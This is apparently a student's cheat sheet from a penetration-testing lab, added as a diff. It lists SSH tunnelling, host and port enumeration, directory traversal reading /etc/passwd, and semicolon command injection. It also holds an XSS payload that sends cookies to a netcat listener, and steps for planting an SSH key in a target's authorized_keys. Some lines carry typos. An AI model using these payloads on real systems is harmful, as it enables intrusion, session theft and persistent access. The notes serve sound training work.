@@ -1,0 +1,79 @@
+
+#QUICK CONNECT
+ssh demo1@10.50.12.21 -L1111:10.208.50.42:80  pass: password
+
+CREATES MASTER SOCKET:
+multiplexing socket: ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+to get into my session: ssh -S /tmp/demo demo1@10.50.12.21
+
+HOST ENUMERATION: Ping sweep (from Remote box)
+linuxpriv> for i in {1..255} ;do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
+for i in {1..255}; do echo $i; done
+
+PORT ENUMERATION WITH DYNAMIC AND PROXYCHAINS
+ssh -S /tmp/demo demo -O forward -D9050
+
+we can verify ss -ntlp | grep 9050
+lin-ops> proxychains nmap 10.208.50.42
+
+TUNNEL TO ...
+10.208.50.42
+22/tcp open ssh
+linux-ops> ssh -S /tmp/demo demo -O forward -L42071:10.208.50.42:22
+ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+
+
+80/tcp open http
+linux-ops> ssh -S /tmp/demo demo -O forward -L42070:10.208.50.42:80
+ssh -MS /tmp/t1 www-data@1274.0.0.1 -p 42071 -fN 2>/dev/null
+ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
+
+
+Firefox browser: 127.0.0.1:42070
+
+HTTP ENUMERATION, We would add notes to pages 
+Check /robots.txt
+linux-ops> proxychains nmap --script=http-Enum 10.208.50.42 80
+|    /robots.txt
+|    /java/
+|    /path/
+|    /uploads/
+
+DIRECTORY TRAVERSAL TAKES ADVANTAGE OF READING FILES AND USING ABSOLUTE PATH 
+../../../../../../etc/passwd
+../../../../../../etc/hosts
+
+CMD INJECTION USES SEMI-COLON TO RUN COMMANDS (NOT AN ACTIVE SHELL, CAN'T CD INTO OTHER DIRECTORIES)
+; pwd
+; whoami
+
+# JAVASCRIPT
+open inspector
+find JS by looking for functions (
+open console in inspector and run js manually, ex: changetext()  it will change banana into melon
+
+# STEAL COOKIES
+setup nc
+nc -lk 10.50.188.45 42071 # Where you want to intercept cookie
+post to /chat
+<script>document.location="http://10.50.188.45:42071/?username=" + document.cookie;</script>
+
+# MALICIOUS UPLOAD REQUIRES 1.UPLOAD  2.FIND UPLOADS  3.CALL UPLOADS
+
+###SSH KEYGEN ###
+Identify user and home directory using : whoami and cat /etc/passwd
+
+# GENERATE OUR KEY
+## From Lin-Ops
+ssh-keygen -t rsa -b 4096 # enter for default option
+No Passphrase
+cat /home/student/.ssh/id_rsa.pub
+
+# ON TARGET, MAKE DIRECTORY AND VERIFY
+; mkdir /var/www/.ssh  ( On cmd injection)
+; ls -la /var/www
+
+# ON TARGET, UPLOAD KEY AND VERIFY
+; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo from ( /home/student/,ssh/id_rsa.pub )
+; cat /var/www/.ssh/authorized_keys
